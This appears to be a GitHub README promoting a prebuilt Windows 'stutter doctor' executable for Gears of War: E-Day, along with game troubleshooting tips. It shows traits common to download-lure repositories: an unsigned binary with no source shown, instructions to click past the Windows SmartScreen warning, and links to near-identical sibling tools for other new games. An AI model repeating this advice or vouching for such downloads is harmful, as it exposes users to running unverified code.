<p align="center">
  <img src="https://i.postimg.cc/RVP1YxV0/banner.png" alt="Gears of War: E-Day UE5 Stutter Doctor — DX12 Shader, Config & Save Diagnostics" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-UE5%20Stutter%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-gears--eday--doctor--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Gears of War: E-Day UE5 Stutter Doctor — DX12 Shader, Config & Save Diagnostics

**Gears of War: E-Day hitching during heavy Locust encounters or crashing with a UE5 D3D12 error on Windows PC? Inspect your AppData\Local\GearsEDay\Saved configs, shader cache headroom, and crash logs before reinstalling.**

Gears of War: E-Day UE5 Stutter Doctor focuses on The Coalition's Unreal Engine 5 PC implementation: **Lumen lighting, Nanite geometry, and DirectX 12 PSO compilation rely heavily on clean `%LOCALAPPDATA%\GearsEDay\Saved` configs and unobstructed GPU shader caches**.

This project is aimed at **Gears of War: E-Day on Windows PC (Steam & Xbox App)**. It concerns `%LOCALAPPDATA%\GearsEDay\Saved` configuration backups, UE5 crash log inspection, and VRAM/shader-cache diagnostics—not anti-cheat bypasses or multiplayer tweaks.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| `D3D12RHI` or `Out of video memory` crash | High textures + Lumen exceeding 8 GB VRAM or outdated GPU driver | Check `Saved\Logs` and lower Texture Quality one step on 8 GB GPUs |
| Micro-stutter entering new combat arenas | Restricted GPU shader cache or low free space on `C:` | Verify `C:` free space (15+ GB) and driver Shader Cache Size |
| Graphics settings fail to save on exit | Read-only flag or sync lock on `Saved\Config\Windows` | Check `GameUserSettings.ini` write permissions |
| Backing up campaign/co-op checkpoints | Single overwritten checkpoint folder in `%LOCALAPPDATA%` | Back up `%LOCALAPPDATA%\GearsEDay\Saved\SaveGames` |

## Download for Windows

[**Download GearsEDayDoctor.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/GearsEDayDoctor.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `GearsEDayDoctor.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\GearsEDay\Saved` and checks `GameUserSettings.ini` and `Engine.ini` attributes.
- Scans `Saved\Logs` for `D3D12RHI`, `DEVICE_REMOVED`, and `Out of video memory` errors.
- Checks free space on drive `C:` for DirectX 12 Pipeline State Object compilation.
- Lists local save files in `Saved\SaveGames` for quick backup verification.

### Sample Diagnostic Output

```text
[GearsEDayDoctor] Inspecting Gears of War: E-Day UE5 Saved directory...
[OK]   Saved Path       : C:\Users\Player\AppData\Local\GearsEDay\Saved
[OK]   GameUserSettings : Found (3.1 KB, writable)
[OK]   Saved\Logs       : No D3D12RHI or Out of video memory errors found
[OK]   SaveGames        : 6 checkpoint files found
[OK]   System Drive C:  : 61.0 GB free
```

The release ZIP is named `GearsEDayDoctor.zip`; the Windows executable inside is named `GearsEDayDoctor.exe`.

1. Close Gears of War: E-Day before moving or checking game files.
2. Click **Download GearsEDayDoctor.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `GearsEDayDoctor.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Gears of War: E-Day and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows PC installation of Gears of War: E-Day, and access to `%LOCALAPPDATA%`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `GearsEDayDoctor.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### DirectX 12 'D3D12RHI' or 'Out of video memory' crash on startup

High-resolution textures combined with Lumen and Frame Generation can exceed 8 GB VRAM budgets on launch, or trigger D3D12 timeouts on older GPU drivers.

### Micro-stutter when entering new Emergence Day combat zones

Incomplete shader pre-compilation or a restricted GPU driver shader cache forces UE5 to compile PSOs mid-firefight.

### Settings in `GameUserSettings.ini` failing to persist

Read-only attributes or cloud-sync conflicts on `%LOCALAPPDATA%\GearsEDay\Saved\Config\Windows` prevent custom resolution or upscaler settings from saving.

### Protecting campaign & co-op checkpoint saves before patches

Creating a dated copy of `SaveGames` protects single-player and co-op campaign checkpoints before installing updates.

## Where Gears of War: E-Day files normally belong

On Windows PC, UE5 configs, crash logs, and local save slots reside in `%LOCALAPPDATA%\GearsEDay\Saved`:

```text
%LOCALAPPDATA%\GearsEDay\Saved\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\GearsEDay\Saved\
├── Config\
│   └── Windows\
│       ├── GameUserSettings.ini
│       └── Engine.ini
├── Logs\
└── SaveGames\
```

Never disable Easy Anti-Cheat or modify protected multiplayer files while troubleshooting single-player frame pacing.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Gears of War: E-Day completely.** Confirm the shipping executable has closed in Task Manager.
2. **Back up `%LOCALAPPDATA%\GearsEDay\Saved`.** Copy `SaveGames` and `Config\Windows` to a dated folder in Documents.
3. **Update GPU drivers and check `C:` free space.** Ensure at least 15 GB free on your system drive for DX12 shader caches.
4. **Inspect `Saved\Logs` for `D3D12` or `Out of video memory` lines.** Check the latest log file to pinpoint whether crashes are VRAM- or driver-related.
5. **Verify installed game files in Steam / Xbox App.** Repair any corrupted `.pak` or `.ucas` archive chunks.
6. **Test one graphics preset change at a time.** Compare 1% low frametimes with Lumen / Shadow quality adjusted in a repeatable checkpoint.
7. **Restart the game cleanly.** Let initial shader compilation complete on the main menu before loading a campaign chapter.

### Before moving any files

Keep a dated copy of `SaveGames` and `GameUserSettings.ini` in Documents before resetting `Saved\Config\Windows`.

## What an effective diagnostic report should tell you

A clear diagnostic report inspects **`%LOCALAPPDATA%\GearsEDay\Saved` configs and logs**, checks free space on `C:`, and verifies GPU VRAM and driver versions.

## FAQ

**Where are Gears of War: E-Day config files stored on Windows?**

Inside `%LOCALAPPDATA%\GearsEDay\Saved\Config\Windows\` (`GameUserSettings.ini` and `Engine.ini`).

**How do I fix 'Out of video memory' crashes in Gears of War: E-Day?**

Update your GPU driver, ensure Windows pagefile is system-managed, and lower Texture Quality one step if using an 8 GB GPU.

**Where are Gears of War: E-Day local saves stored?**

On Steam Windows setups, local saves live under `%LOCALAPPDATA%\GearsEDay\Saved\SaveGames\`.

**Does this tool modify anti-cheat or game binaries?**

No. It only reads local configuration, log, and save folders.

**Will clearing Config\Windows delete my campaign saves?**

No, as long as you keep `Saved\SaveGames` intact (and backed up first).

**Are any game files bundled with this repository?**

No copyrighted game files are included here.

## Useful reading

- [Gears of War Official Website (Xbox)](https://www.gearsofwar.com/)
- [Gears of War: E-Day on Steam](https://store.steampowered.com/app/3010850/Gears_of_War_EDay/)

## More Windows Game Diagnostic Tools

- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check
- [Marvel1943-ShaderConfigAudit](../Marvel1943-ShaderConfigAudit) — Marvel 1943: Rise of Hydra UE5 shader & VRAM audit
- [Judas-UE5SaveFrameGuard](../Judas-UE5SaveFrameGuard) — Judas UE5 shader compilation & branching save guard
- [Fable2026-ShaderCrashGuard](../Fable2026-ShaderCrashGuard) — Fable (2026) ForzaTech shader optimization & crash guard

*Independent community project. Not affiliated with The Coalition, Xbox Game Studios, Microsoft, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
 
 
